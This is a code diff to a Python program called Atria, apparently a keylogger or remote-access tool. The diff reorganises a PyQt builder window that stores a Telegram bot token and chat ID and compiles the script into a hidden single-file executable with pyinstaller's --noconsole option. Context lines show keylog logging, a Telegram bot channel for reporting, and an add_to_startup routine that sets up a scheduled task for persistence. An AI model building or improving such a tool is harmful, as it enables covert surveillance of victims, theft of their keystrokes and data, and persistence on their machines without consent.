@@ -58,12 +58,79 @@ def retry_on_exception(exception_type, retries=3, delay=1):
         return wrapper
     return decorator
 
+# Initialize GUI for bot configuration
+class BotConfigGUI(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.initUI()
+    
+    # UI setup for Atria configuration
+    def initUI(self):
+        self.setWindowTitle('Atria Configuration')
+        self.setGeometry(100, 100, 300, 200)
+
+        self.config = load_configuration()
+
+        self.token_label = QLabel('Bot Token:')
+        self.token_input = QLineEdit(self)
+        self.token_input.setText(self.config[0] if self.config[0] else '')
+        self.chat_id_label = QLabel('Chat ID:')
+        self.chat_id_input = QLineEdit(self)
+        self.chat_id_input.setText(self.config[1] if self.config[1] else '')
+        self.save_button = QPushButton('Save Configuration', self)
+        self.compile_button = QPushButton('Compile Script', self)
+        self.save_button.clicked.connect(self.save_configuration)
+        self.compile_button.clicked.connect(self.compile_script)
+
+        layout = QVBoxLayout()
+        layout.addWidget(self.token_label)
+        layout.addWidget(self.token_input)
+        layout.addWidget(self.chat_id_label)
+        layout.addWidget(self.chat_id_input)
+        layout.addWidget(self.save_button)
+        layout.addWidget(self.compile_button)
+        self.setLayout(layout)
+
+    # Saves bot configuration and shows alerts
+    def save_configuration(self):
+        try:
+            bot_token = self.token_input.text()
+            chat_id = self.chat_id_input.text()
+
+            if bot_token and chat_id:
+                config_path = get_resource_path()
+                with open(config_path, 'w') as file:
+                    file.write(f"bot_token={bot_token}\n")
+                    file.write(f"chat_id={chat_id}\n")
+                QMessageBox.information(self, 'Success', 'Configuration saved successfully!')
+            else:
+                QMessageBox.warning(self, 'Warning', 'Bot token and chat ID cannot be empty.')
+        except Exception as e:
+            QMessageBox.critical(self, 'Error', f'Failed to save configuration: {str(e)}')
+
+    # Starts script compilation with alert
+    def compile_script(self):
+        try:
+            QMessageBox.information(self, 'Compilation', 'Compilation started. Check the command prompt for logs.')
+            self.close()
+
+            subprocess.Popen(
+                'start cmd.exe /K pyinstaller --onefile --noconsole --add-data "bot_config.txt;." Atria.py',
+                shell=True
+            )
+        except Exception as e:
+            QMessageBox.critical(self, 'Error', f'Failed to start compilation: {str(e)}')
+
 # Get resource path based on execution mode
 def get_resource_path():
     if IS_COMPILED:
         return os.path.join(sys._MEIPASS, 'bot_config.txt')
     else:
         return os.path.join(os.path.dirname(os.path.abspath(__file__)), 'bot_config.txt')
+    
+# Validate the bot token format
+def is_valid_bot_token(token):
+    return ':' in token and len(token.split(':')) == 2
 
 # Load and validate config file
 def load_configuration():
@@ -100,8 +167,16 @@ def log_message(message, log_type='keylog'):
 # Initialize bot with configuration
 bot_token, chat_id = load_configuration()
 
+if not bot_token or not chat_id or not is_valid_bot_token(bot_token):
+    log_message("Invalid or missing bot token or chat ID. Opening GUI.", 'error')
+    
+    app = QApplication(sys.argv)
+    window = BotConfigGUI()
+    window.show()
+    sys.exit(app.exec())
+
 try:
-    bot = telebot.TeleBot(bot_token) if bot_token else None
+    bot = telebot.TeleBot(bot_token)
 except Exception as e:
     log_message(f"Error initializing bot: {e}", 'error')
     bot = None
@@ -1148,69 +1223,6 @@ def add_to_startup():
         print(f"{task_name} added to startup as a scheduled task.")
     except Exception as e:
         print(f"Failed to add {task_name} to startup as a scheduled task: {e}")
-
-# Initialize GUI for bot configuration
-class BotConfigGUI(QWidget):
-    def __init__(self):
-        super().__init__()
-        self.initUI()
-    
-    # UI setup for Atria configuration
-    def initUI(self):
-        self.setWindowTitle('Atria Configuration')
-        self.setGeometry(100, 100, 300, 200)
-
-        self.config = load_configuration()
-
-        self.token_label = QLabel('Bot Token:')
-        self.token_input = QLineEdit(self)
-        self.token_input.setText(self.config[0] if self.config[0] else '')
-        self.chat_id_label = QLabel('Chat ID:')
-        self.chat_id_input = QLineEdit(self)
-        self.chat_id_input.setText(self.config[1] if self.config[1] else '')
-        self.save_button = QPushButton('Save Configuration', self)
-        self.compile_button = QPushButton('Compile Script', self)
-        self.save_button.clicked.connect(self.save_configuration)
-        self.compile_button.clicked.connect(self.compile_script)
-
-        layout = QVBoxLayout()
-        layout.addWidget(self.token_label)
-        layout.addWidget(self.token_input)
-        layout.addWidget(self.chat_id_label)
-        layout.addWidget(self.chat_id_input)
-        layout.addWidget(self.save_button)
-        layout.addWidget(self.compile_button)
-        self.setLayout(layout)
-
-    # Saves bot configuration and shows alerts
-    def save_configuration(self):
-        try:
-            bot_token = self.token_input.text()
-            chat_id = self.chat_id_input.text()
-
-            if bot_token and chat_id:
-                config_path = get_resource_path()
-                with open(config_path, 'w') as file:
-                    file.write(f"bot_token={bot_token}\n")
-                    file.write(f"chat_id={chat_id}\n")
-                QMessageBox.information(self, 'Success', 'Configuration saved successfully!')
-            else:
-                QMessageBox.warning(self, 'Warning', 'Bot token and chat ID cannot be empty.')
-        except Exception as e:
-            QMessageBox.critical(self, 'Error', f'Failed to save configuration: {str(e)}')
-
-    # Starts script compilation with alert
-    def compile_script(self):
-        try:
-            QMessageBox.information(self, 'Compilation', 'Compilation started. Check the command prompt for logs.')
-            self.close()
-
-            subprocess.Popen(
-                'start cmd.exe /K pyinstaller --onefile --noconsole --add-data "bot_config.txt;." Atria.py',
-                shell=True
-            )
-        except Exception as e:
-            QMessageBox.critical(self, 'Error', f'Failed to start compilation: {str(e)}')
 
 if __name__ == '__main__':
     # Runs GUI if not compiled
